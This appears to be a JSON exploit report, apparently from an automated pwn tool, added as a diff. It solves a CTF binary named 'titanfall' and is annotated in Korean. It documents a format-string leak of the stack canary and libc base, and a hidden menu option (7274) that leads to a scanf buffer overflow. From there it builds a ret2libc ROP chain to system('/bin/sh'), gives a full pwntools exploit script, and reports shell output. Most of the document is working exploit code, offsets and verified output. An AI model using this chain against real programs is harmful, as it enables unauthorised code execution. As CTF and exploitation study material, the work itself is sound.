@@ -1,0 +1,264 @@
+{
+  "meta": {
+    "title": "titanfall — FSB(one-shot) + Hidden Menu BOF 2-stage ROP",
+    "binary": "/mnt/d/Coding/Projects/PwnAutomator/mcps/test/chall",
+    "arch": "x86_64 LE",
+    "ubuntu": "22.04",
+    "result": "shell acquired (uid=1000(happysmile))"
+  },
+  "protections": {
+    "RELRO": "Full",
+    "Canary": true,
+    "NX": true,
+    "PIE": true,
+    "base": "0x555555554000 (ASLR)",
+    "SHSTK": true,
+    "IBT": true,
+    "note": "모든 보호 기법 활성화. Full RELRO로 GOT 덮어쓰기 불가. PIE로 바이너리 주소 매번 변경. Canary로 단순 BOF 시 탐지. NX로 셸코드 불가 → ROP 체인 필요. 단, PIE base는 exploit에 불필요(libc 가젯만 사용)."
+  },
+  "analysis_steps": [
+    {
+      "step": 1,
+      "phase": "binary_info",
+      "tool": "meta",
+      "args": {},
+      "output": {
+        "arch": "x86/little/64",
+        "checksec": "Full RELRO, Canary found, NX enabled, PIE enabled, SHSTK, IBT"
+      },
+      "reasoning": "모든 보호 기법이 활성화된 바이너리. GOT 덮어쓰기/셸코드 모두 불가. canary leak + libc leak → ROP chain이 필요한 전형적인 구조."
+    },
+    {
+      "step": 2,
+      "phase": "function_discovery",
+      "tool": "func_list",
+      "args": {},
+      "output": {
+        "functions": ["Init", "select_titan", "vanguard", "lunch", "menu", "main"]
+      },
+      "reasoning": "심볼이 살아있어 함수 이름 확인 가능. Titanfall 게임 테마로 vanguard, select_titan 등이 존재. menu가 핵심 인터랙션 함수. lunch는 본문이 비어있음. 우선 main → menu → 각 기능 순서로 분석."
+    },
+    {
+      "step": 3,
+      "phase": "main_analysis",
+      "tool": "decompile_by_name",
+      "args": {"name": "main"},
+      "output": {
+        "code": "int main() { Init(); menu(); return 0; }"
+      },
+      "reasoning": "main은 Init() → menu() 단순 호출. 취약점은 menu() 내부에 존재."
+    },
+    {
+      "step": 4,
+      "phase": "menu_analysis",
+      "tool": "decompile_by_name",
+      "args": {"name": "menu"},
+      "output": {
+        "summary": "char local_58[72] (실제 버퍼 [RBP-0x50], 48바이트 read). printf(local_58) — FSB. 메뉴: 1=select_titan, 2=Lunch(exit if check), 3=exit, 0x1c6a=vanguard(히든).",
+        "key_vulnerabilities": [
+          "write(1, prompt, 0x18) → read(0, local_58, 0x30) → printf(local_58): format string bug",
+          "scanf('%d', &local_5c)에서 0x1c6a(7274) 입력 시 vanguard() 호출 — 소스에 없는 히든 옵션"
+        ]
+      },
+      "reasoning": "두 가지 핵심 취약점 발견. (1) printf(local_58): 사용자 입력을 포맷 스트링으로 직접 사용 → FSB. 단, read는 48바이트 제한이므로 one-shot leak만 가능. (2) 메뉴 번호 0x1c6a(7274)는 일반 사용자가 알 수 없는 숨겨진 경로로 vanguard()를 호출함. 이 둘을 조합하면 leak + ROP가 가능."
+    },
+    {
+      "step": 5,
+      "phase": "vanguard_analysis",
+      "tool": "decompile_by_name",
+      "args": {"name": "vanguard"},
+      "output": {
+        "code": "void vanguard() { char local_28[24]; long canary; canary = fs:0x28; puts('RSR vanguard...'); printf('Please enter the name of titan : '); scanf('%s', local_28); check=1; canary_check(); }",
+        "asm_key": "sub rsp, 0x20 → local_28 at [RBP-0x20], canary at [RBP-0x08]"
+      },
+      "reasoning": "scanf('%s', local_28): %s는 공백 문자 전까지 무제한 읽기 → 24바이트 버퍼 초과 시 BOF. 디스어셈블리 확인: sub rsp,0x20 → buffer=[RBP-0x20](24바이트), canary=[RBP-0x08]. canary가 있으므로 FSB에서 canary를 미리 leak해야 한다."
+    },
+    {
+      "step": 6,
+      "phase": "stack_layout_calculation",
+      "tool": "reasoning",
+      "args": {},
+      "output": {
+        "menu_frame": {
+          "sub_rsp": "0x60",
+          "buffer_local_58": "[RBP-0x50]",
+          "menu_choice_local_5c": "[RBP-0x54]",
+          "canary": "[RBP-0x08]",
+          "saved_rbp": "[RBP+0x00]",
+          "saved_rip": "[RBP+0x08]"
+        },
+        "printf_fsb_positions": {
+          "rsp_at_call": "RBP-0x60",
+          "pos_6": "[RBP-0x60] (first stack-based variadic arg)",
+          "pos_8": "[RBP-0x50] = format string buffer itself",
+          "pos_17": "[RBP-0x08] = canary",
+          "pos_18": "[RBP+0x00] = saved_rbp (main's RBP)",
+          "pos_19": "[RBP+0x08] = saved_rip (return into main)"
+        }
+      },
+      "reasoning": "menu() 스택 레이아웃 계산: sub rsp,0x60으로 프레임 크기 0x60. printf(local_58) 호출 시 RSP = RBP-0x60. printf의 variadic 인자는 6개 레지스터(rdi=fmt, rsi, rdx, rcx, r8, r9) 이후 스택에서 읽힘. 스택 기반 인자 시작 = [RBP-0x60] = %6$p. buffer_start([RBP-0x50]) = %6 + (0x10/8) = %8$p. canary([RBP-0x08]) = %8 + (0x48/8) = %17$p."
+    },
+    {
+      "step": 7,
+      "phase": "fsb_register_analysis",
+      "tool": "debug.context",
+      "args": {"session_id": "1"},
+      "output": {
+        "fsb_output_positions": {
+          "%1$p": "0x7fffffffb7e0 (rsi, 스택주소 — 이전 printf 잔여)",
+          "%3$p": "0x7ffff7e99907 (rcx = __GI___libc_write+23)",
+          "%8$p": "0x2432252e70243125 (포맷스트링 버퍼 자체)",
+          "%17$p": "canary",
+          "%19$p": "0x55555555564c (menu saved_rip → main)"
+        }
+      },
+      "reasoning": "실행 후 FSB 출력 분석. %3$p = rcx = 0x7ffff7e99907. info proc mappings에서 libc_base = 0x7ffff7d85000이므로 offset = 0x7ffff7e99907 - 0x7ffff7d85000 = 0x114907. 이 값은 __GI___libc_write+23 (libc write 래퍼의 syscall 다음 명령 주소). write() 호출 후 printf('hello, ')가 내부적으로 다시 write를 호출하여 rcx를 갱신하므로, printf(local_58) 호출 직전에도 rcx = libc_write+23으로 신뢰성 있게 유지됨. 이를 이용해 libc_base를 leak: libc_base = %3$p - 0x114907."
+    },
+    {
+      "step": 8,
+      "phase": "gadget_search",
+      "tool": "debug.ropgadget.libc",
+      "args": {},
+      "output": {
+        "pop_rdi_ret": "libc + 0x2a3e5 : pop rdi ; ret",
+        "ret": "libc + 0x29139 : ret"
+      },
+      "reasoning": "바이너리에 pop rdi; ret 가젯이 없으므로 libc 가젯 사용. ROPgadget으로 libc에서 pop rdi;ret(0x2a3e5)와 스택 정렬용 ret(0x29139) 확보."
+    },
+    {
+      "step": 9,
+      "phase": "libc_symbol_offsets",
+      "tool": "debug_cmd",
+      "args": {"gdb_cmd": "p system; find libc_base,libc_end,'/bin/sh'"},
+      "output": {
+        "system_offset": "libc + 0x50d70",
+        "binsh_offset": "libc + 0x1d8678 (found at 0x7ffff7f5d678)"
+      },
+      "reasoning": "GDB에서 system()과 /bin/sh 오프셋 확인. system = libc_base+0x50d70, /bin/sh = libc_base+0x1d8678. 이제 ROP chain 구성에 필요한 모든 주소 확보."
+    },
+    {
+      "step": 10,
+      "phase": "bof_layout_verification",
+      "tool": "mem.asm",
+      "args": {"addr": "0x1013e1", "count": 25},
+      "output": {
+        "prologue": "endbr64; push rbp; mov rbp,rsp; sub rsp,0x20",
+        "buffer_addr": "LEA RAX,[RBP-0x20] → local_28 at [RBP-0x20]",
+        "canary_addr": "MOV qword ptr [RBP-0x08],RAX → canary at [RBP-0x08]"
+      },
+      "reasoning": "vanguard() 어셈블리 확인: sub rsp,0x20으로 0x20 크기 프레임. buffer=[RBP-0x20](24바이트), canary=[RBP-0x08]. overflow 거리: RBP-0x20 → RBP-0x08 = 0x18 = 24바이트. payload: [0:24]=패딩, [24:32]=canary복원, [32:40]=fake_rbp, [40:48]=pop_rdi, [48:56]=/bin/sh, [56:64]=ret(정렬), [64:72]=system."
+    },
+    {
+      "step": 11,
+      "phase": "stack_alignment_analysis",
+      "tool": "reasoning",
+      "args": {},
+      "output": {
+        "vanguard_rbp_mod16": "0 (call chain: libc_start→main→menu→call vanguard push ret addr→push rbp→sub 0x20, all 16-byte aligned)",
+        "system_entry_rsp": "vanguard_RBP + 0x28 (after LEAVE+RET+pop_rdi+ret_gadget+ret_to_system)",
+        "rsp_mod16": "(vanguard_RBP+0x28) % 16 = 8 ✓"
+      },
+      "reasoning": "system() 호출 전 RSP를 16바이트 정렬(8 mod 16)해야 함. vanguard_RBP % 16 == 0이므로: LEAVE 후 RSP = vanguard_RBP+0x10(0 mod 16), pop_rdi 후 RSP = +0x18(8 mod 16), ret 후 RSP = +0x20(0 mod 16), ret_gadget 후 RSP = +0x28(8 mod 16). ret_gadget을 삽입해야 정렬이 맞음."
+    },
+    {
+      "step": 12,
+      "phase": "exploit_execution",
+      "tool": "pwn.payload.execute",
+      "args": {},
+      "output": {
+        "libc_base": "0x7fef85d6e000",
+        "canary": "0xb5a1f3c4f0fd0f00",
+        "system": "0x7fef85dbed70",
+        "shell_output": "uid=1000(happysmile) gid=1000(happysmile) ..."
+      },
+      "reasoning": "첫 실행에서 셸 획득 성공. FSB로 libc+canary leak, vanguard BOF로 ROP 실행. scanf('%s')는 null바이트(0x00, canary 최하위 바이트)를 whitespace로 취급하지 않으므로 payload 전체가 정상 전달됨."
+    }
+  ],
+  "vulnerabilities": [
+    {
+      "id": "VULN-001",
+      "name": "Format String Bug — printf(user_input) in menu()",
+      "location": "menu() 내 printf(local_58), 0x10151e",
+      "root_cause": "사용자 입력(read로 48바이트)을 포맷 스트링 인자 없이 printf()에 직접 전달. %N$p로 스택 임의 위치 읽기 가능.",
+      "impact": "스택 상의 canary(%17$p)와 libc 주소(rcx 레지스터 %3$p = __libc_write+23) leak. one-shot이지만 한 번에 여러 값 leak 가능.",
+      "constraints": "read() 제한으로 포맷 스트링은 48바이트 이내. printf는 1회만 호출됨(one-shot FSB)."
+    },
+    {
+      "id": "VULN-002",
+      "name": "Stack Buffer Overflow — scanf('%s') in vanguard()",
+      "location": "vanguard() 내 scanf('%s', local_28), 0x10142c",
+      "root_cause": "24바이트 스택 버퍼(local_28)에 %s 포맷으로 무제한 입력. 공백 전까지 읽으므로 canary/saved_rip까지 덮어쓰기 가능.",
+      "impact": "canary를 미리 leak하여 정확히 복원하면 saved_rip를 임의 주소로 덮어 RIP 제어 가능.",
+      "constraints": "히든 메뉴 번호 0x1c6a(7274) 입력 필요. check 전역변수가 0이어야 vanguard() 호출 가능(select_titan 미실행 상태)."
+    }
+  ],
+  "exploit": {
+    "strategy": "FSB one-shot으로 canary + libc_base 동시 leak → 히든 메뉴(0x1c6a)로 vanguard() 진입 → scanf BOF로 ROP chain 실행 → system('/bin/sh')",
+    "phases": [
+      {
+        "phase": 1,
+        "name": "FSB one-shot leak",
+        "description": "name 입력 시 '%3$p|%17$p' 전송. %3$p = rcx = libc_write+23(libc_base+0x114907), %17$p = canary. 파싱: libc_base = %3$p - 0x114907, canary = %17$p.",
+        "fsb_format": "%3$p|%17$p",
+        "parse": "leak.split('|') → [libc_write23, canary]"
+      },
+      {
+        "phase": 2,
+        "name": "히든 메뉴 진입 → vanguard() 호출",
+        "description": "메뉴 선택에 7274(0x1c6a)를 입력. check=0 상태이므로 vanguard() 호출. vanguard는 'Please enter the name of titan : ' 프롬프트 출력 후 scanf('%s')로 대기.",
+        "send": "7274"
+      },
+      {
+        "phase": 3,
+        "name": "BOF ROP chain 실행",
+        "description": "vanguard() scanf('%s')에 72바이트 payload 전송: A*24(버퍼채우기) + p64(canary) + p64(0) + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system). LEAVE+RET으로 ROP 실행.",
+        "payload_structure": [
+          {"offset": "0-23",   "content": "b'A'*24",        "purpose": "local_28 버퍼 채우기"},
+          {"offset": "24-31",  "content": "p64(canary)",    "purpose": "canary 원복 → __stack_chk_fail 우회"},
+          {"offset": "32-39",  "content": "p64(0)",         "purpose": "fake saved_rbp"},
+          {"offset": "40-47",  "content": "p64(pop_rdi)",   "purpose": "saved_rip 덮어쓰기, ROP 시작: RDI = /bin/sh"},
+          {"offset": "48-55",  "content": "p64(binsh)",     "purpose": "'/bin/sh' 주소"},
+          {"offset": "56-63",  "content": "p64(ret)",       "purpose": "RSP 16바이트 정렬용 ret"},
+          {"offset": "64-71",  "content": "p64(system)",    "purpose": "system('/bin/sh') 호출"}
+        ],
+        "alignment_note": "ret 가젯 삽입 이유: vanguard_RBP%16==0이므로 ret 없이 system 진입 시 RSP=(RBP+0x20)%16==0(misaligned). ret 하나 추가로 RSP=(RBP+0x28)%16==8(정렬)."
+      }
+    ]
+  },
+  "payload_code": "#!/usr/bin/env python3\nfrom pwn import *\n\nbinary_path = '/mnt/d/Coding/Projects/PwnAutomator/mcps/test/chall'\nelf = ELF(binary_path, checksec=False)\ncontext.binary = elf\ncontext.arch   = 'amd64'\ncontext.log_level = 'info'\n\nLIBC_WRITE23   = 0x114907   # __GI___libc_write+23 (rcx 잔여값)\nLIBC_SYSTEM    = 0x50d70\nLIBC_BINSH     = 0x1d8678\nLIBC_POP_RDI   = 0x2a3e5   # pop rdi ; ret\nLIBC_RET       = 0x29139   # ret (스택 정렬)\n\nlibc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)\n\np = process(binary_path)\n\n# Stage 1: FSB → libc_base + canary\np.recvuntil(b'> ')\np.sendline(b'%3$p|%17$p')\n\np.recvuntil(b'hello, ')\nleak = p.recvline().strip().split(b'|')\nlibc_write23_val = int(leak[0], 16)\ncanary           = int(leak[1], 16)\n\nlibc_base   = libc_write23_val - LIBC_WRITE23\nsystem_addr = libc_base + LIBC_SYSTEM\nbinsh_addr  = libc_base + LIBC_BINSH\npop_rdi     = libc_base + LIBC_POP_RDI\nret_gadget  = libc_base + LIBC_RET\n\nlog.info(f'libc_base  = {hex(libc_base)}')\nlog.info(f'canary     = {hex(canary)}')\nlog.info(f'system     = {hex(system_addr)}')\n\n# Stage 2: vanguard() BOF\np.recvuntil(b'> ')\np.sendline(b'7274')        # 0x1c6a 히든 메뉴\n\np.recvuntil(b'titan : ')\n\npayload  = b'A' * 24\npayload += p64(canary)\npayload += p64(0)\npayload += p64(pop_rdi)\npayload += p64(binsh_addr)\npayload += p64(ret_gadget)\npayload += p64(system_addr)\np.sendline(payload)\n\np.sendline(b'id')\nout = p.recv(timeout=3)\nlog.success(f'output: {out.decode(errors=\"replace\")}')\np.interactive()",
+  "libc_offsets": {
+    "libc_path": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+    "ubuntu": "22.04",
+    "write23": "0x114907  (__GI___libc_write+23, rcx 잔여값)",
+    "system": "0x50d70",
+    "binsh": "0x1d8678",
+    "pop_rdi_ret": "0x2a3e5",
+    "ret": "0x29139"
+  },
+  "stack_offsets": {
+    "function": "menu / vanguard",
+    "menu_frame_size": "0x60",
+    "menu_buffer_to_rbp": "[RBP-0x50] (read 0x30=48바이트 제한)",
+    "menu_canary": "[RBP-0x08]",
+    "fsb_canary_position": "%17$p (stack slot: RSP+0x58 at printf call time)",
+    "fsb_libc_position": "%3$p (rcx 레지스터, __libc_write+23)",
+    "vanguard_buffer": "[RBP-0x20] (24바이트)",
+    "vanguard_canary": "[RBP-0x08]",
+    "vanguard_saved_rip": "[RBP+0x08]",
+    "bof_padding_to_canary": "24바이트",
+    "bof_total_payload": "72바이트"
+  },
+  "verification": {
+    "tool": "pwn.payload.execute",
+    "output": "uid=1000(happysmile) gid=1000(happysmile) groups=1000(happysmile),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)",
+    "result": "success"
+  },
+  "key_insights": [
+    "FSB one-shot 제약(read 48바이트)에서는 %N$p를 최소화하여 핵심 값만 leak해야 한다. 이 바이너리에서는 rcx 레지스터(%3$p)에 이미 libc 주소가 있어 스택 탐색 없이 libc_base를 얻을 수 있다.",
+    "rcx 레지스터에 __libc_write+23이 남아있는 이유: write() PLT 호출 시 libc 내부에서 syscall 명령이 실행되면 CPU가 rcx에 다음 명령 주소를 저장한다. 이후 printf('hello, ')가 내부적으로 write를 다시 호출하여 rcx가 갱신되므로, printf(local_58) 호출 시 rcx = __libc_write+23이 신뢰성 있게 유지된다.",
+    "히든 메뉴 번호 0x1c6a(7274)는 소스코드나 바이너리에 출력 없이 분기만 존재. 디컴파일에서 switch 구조를 분석하거나 어셈블리에서 CMP EAX, 0x1c6a를 발견해야 알 수 있다.",
+    "scanf('%s')는 공백 문자(0x20, 0x09, 0x0a 등)에서만 입력을 종료하며, null 바이트(0x00)는 whitespace가 아니므로 읽기를 계속한다. canary의 최하위 바이트가 0x00이어도 payload 전달에 문제없다. 단 0x0a(개행)가 payload 중간에 있으면 조기 종료되므로 주의.",
+    "vanguard()의 check=1 설정은 scanf 이후에 오므로, BOF로 saved_rip를 덮어도 check 설정은 실행됨. ROP chain 실행은 함수 종료 시 LEAVE+RET에서 일어나므로 check 값은 exploit에 영향 없음.",
+    "PIE가 활성화되어 있지만 ROP chain에 바이너리 가젯을 사용하지 않으므로 PIE base leak이 불필요. libc 가젯(pop rdi, ret, system)만으로 exploit이 완성되어 공격이 단순화됨."
+  ]
+}
